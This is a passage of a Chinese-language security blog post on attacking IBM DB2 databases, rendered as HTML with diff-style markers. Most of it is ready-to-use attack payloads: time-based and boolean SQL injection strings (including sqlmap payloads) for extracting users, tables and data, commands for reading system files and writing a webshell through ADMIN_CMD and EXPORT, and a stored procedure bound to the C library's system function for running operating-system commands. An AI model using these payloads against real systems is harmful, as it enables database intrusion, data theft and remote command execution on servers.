+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND 1&#x3D;(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS  T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 where 1&#x3D;1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)&gt;0 and (SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1)&#x3D;68</span><br></pre></td></tr></table></figure>
+<p>user第一个字符的ASCII码为68将造成延时</p>
+<p>sqlmap里的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 AND 3230&#x3D;(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE </span><br><span class="line">(SUBSTR((SELECT COALESCE(RTRIM(CAST(schemaname AS CHAR(254))),CHR(32)) FROM (SELECT ROW_NUMBER() OVER () AS LIMIT,schemaname FROM syscat.schemata) AS qq WHERE LIMIT&#x3D;1),4,1)&gt;CHR(47)))</span><br><span class="line"></span><br><span class="line">1 AND 8822&#x3D;(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE </span><br><span class="line">(SUBSTR((SELECT COALESCE(RTRIM(CAST(schemaname AS CHAR(254))),CHR(32)) FROM (SELECT ROW_NUMBER() OVER () AS LIMIT,schemaname FROM syscat.schemata) AS qq WHERE LIMIT&#x3D;1),4,1)&gt;CHR(65)))</span><br></pre></td></tr></table></figure>
+<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><ol>
+<li>判断数据库类型<br>(select count(versionnumber) from sysibm.sysversions)&gt;0</li>
+<li>获取当前数据库的用户<br>and ascii(substr((select distinct owner from syscat.tables where tabschema=current schema),1,1))&gt;0</li>
+<li>获取当前数据库中数据表名<br>and ascii(substr((select tabname from syscat.tables where tabschema=current schema limit 0,1),1,1))&gt;0</li>
+<li>获取当前数据库中数据字段名称<br>and ascii(substr((select colname from syscat.columns where tabschema=current schema and tabname=’test111’ limit 0,1),1,1))&gt;0</li>
+<li>获取所有数据<br>and ascii(substr((select username from users limit 0,1),1,1))&gt;0</li>
+</ol>
+<p>好像是不支持带外的</p>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>DB2中的数据导入导出分别为：Import与Export<br>DEL:界定的ASCII文件，行分隔符与列分隔符将数据分开<br>ASC:定长的ASCII文件，行按照行分隔符分开，列定长<br>PC/IXF:只能用在DB2之间导数据，根据类型数字值被打包成十进制或者二进制，字符被保存为ASCII，只保存变量已经使用的长度，文件中包括表的定义和表的数据</p>
+<ul>
+<li>读文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IMPORT FROM C:\Windows\win.ini OF DEL INSERT INTO CONTENT</span><br></pre></td></tr></table></figure>
+<p>db2 8.2.2以后的版本引入存储过程语法执行db2命令行命令，其schema为SYSPROC<br>需要权限sysadm、dbadmin，也就是至少是dba权限</p>
+<p>ADMIN_CMD(‘whoami’)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL ADMIN_CMD(&#39;IMPORT FROM C:\Windows\win.ini OF DEL INSERT INTO CONTENT&#39;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>写文件<br>数据库的文件写到文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPORT TO result.csv OF DEL MODIFIED BY NOCHARDEL SELECT col1, col2, coln FROM testtable;</span><br></pre></td></tr></table></figure>
+<p>远程连接数据库的用户可以先创建一个表（或对EXPORT命令涉及的表具有SELECT权限），然后调用ADMIN_CMD存储过程执行EXPORT命令向操作系统写文件</p>
+</li>
+<li><p>写shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL SYSPROC.ADMIN_CMD (&#39;EXPORT TO C:\RESULT.TXT OF DEL MODIFIED BY NOCHARDEL SELECT &#39;&#39;webshell&#39;&#39; FROM 存在的表 FETCH FIRST 1 ROWS ONLY&#39;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/11.png" alt="11"></p>
+</li>
+</ul>
+<p>ps:EXPORT向文件写入自定义字符串内容时SELECT的表中必须至少有一条记录否则写入内容为空</p>
+<h2 id="利用DB2执行操作系统命令"><a href="#利用DB2执行操作系统命令" class="headerlink" title="利用DB2执行操作系统命令"></a>利用DB2执行操作系统命令</h2><p>可利用DB2存储过程执行操作系统命令。创建一个可以执行操作系统命令的存储过程并调用，需要权限CREATE_NOT_FENCED开启</p>
+<p>查询存储过程<br>db2 =&gt;SELECT * FROM SYSCAT.PROCEDURES<br>db2 =&gt;SELECT * FROM SYSibm.sysprocedures</p>
+<p>windows:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> db2_cmd_exec (<span class="keyword">IN</span> cmd <span class="type">varchar</span>(<span class="number">200</span>)) </span><br><span class="line"><span class="keyword">EXTERNAL</span> NAME <span class="string">&#x27;c:\windows\system32\msvcrt!system&#x27;</span> </span><br><span class="line"><span class="keyword">LANGUAGE</span> C </span><br><span class="line"><span class="keyword">DETERMINISTIC</span> </span><br><span class="line"><span class="keyword">PARAMETER</span> STYLE DB2SQL </span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> db2_cmd_exec (<span class="string">&#x27;whoami /all &gt; C:\whoami.log&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>linux:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> db2_cmd_exec (<span class="keyword">IN</span> cmd <span class="type">varchar</span>(<span class="number">200</span>)) <span class="keyword">EXTERNAL</span> NAME <span class="string">&#x27;/usr/lib/libstdc++.so.6!system&#x27;</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">DETERMINISTIC</span> <span class="keyword">PARAMETER</span> STYLE DB2SQL <span class="keyword">call</span> db2_cmd_exec (<span class="string">&#x27;whoami &gt; /tmp/whoami.log&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>字符串操作函数 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangpei/p/3552783.html">https://www.cnblogs.com/wangpei/p/3552783.html</a></p>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/2021/01/25/viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    viewstate反序列化实战
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2020/04/19/cc5%E9%93%BE/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">cc5链</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            G7shot &copy; 2022 
+            <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by g7shot.com</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
